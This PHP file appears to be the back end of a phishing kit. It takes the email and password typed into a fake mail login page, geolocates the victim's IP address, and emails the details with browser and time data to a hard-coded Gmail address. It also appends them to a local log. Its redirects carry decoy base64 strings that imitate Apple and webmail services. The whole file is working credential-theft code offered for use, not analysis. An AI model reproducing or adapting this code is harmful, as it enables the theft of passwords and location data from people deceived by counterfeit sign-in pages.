<?php
$login = $_REQUEST['login'];
$passwd = $_REQUEST['passwd'];


if (empty($login) || empty($passwd)) {
header( "Location: index.php?cgi-bin=access&login=$login&.verify?service=mail&data:text/html;charset=utf-8;base64,PGh0bWw+DQo8c3R5bGU+Inet%26cookieTime%3D1486206654%26RelayState%3Dhttp%253A%252F%252F;base64,PGh0bWw+DQorand=aHR0cDovL3d3dy5hcHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3NGY4MTI3ZGZhMWNkNDBlNWZkNGY0MWNhZQ&r=GJvZHkgeyBtYXJcmFthcHBsZS5jb20vc2hvcHwxYW9zNG=" );
}
else {

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "============= [ Logs ] =============\n";
$message .= "Em: ".$_POST['login']."\n";
$message .= "Pswd : ".$_POST['passwd']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'MailBox';
$subj = "$geoplugin->ip | $geoplugin->countryName | $geoplugin->countryCode ";
$from = "From: $domain<west>\n";
mail("leoco012345@gmail.com",$subj,$message,$from);

file_put_contents('../china.txt', $message, FILE_APPEND);


header("Location: loading.php?cgi-bin=access&login=$login&.verify?service=mail&data:text/html;charset=utf-8;base64,PGh0bWw+DQo8c3R5bGU+Inet%26cookieTime%3D1486206654%26RelayState%3Dhttp%253A%252F%252F;base64,PGh0bWw+DQorand=aHR0cDovL3d3dy5hcHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3");
}
?>
<html>
   <head>
   
      
      
   </head>
   
   <body>
   </body>
</html>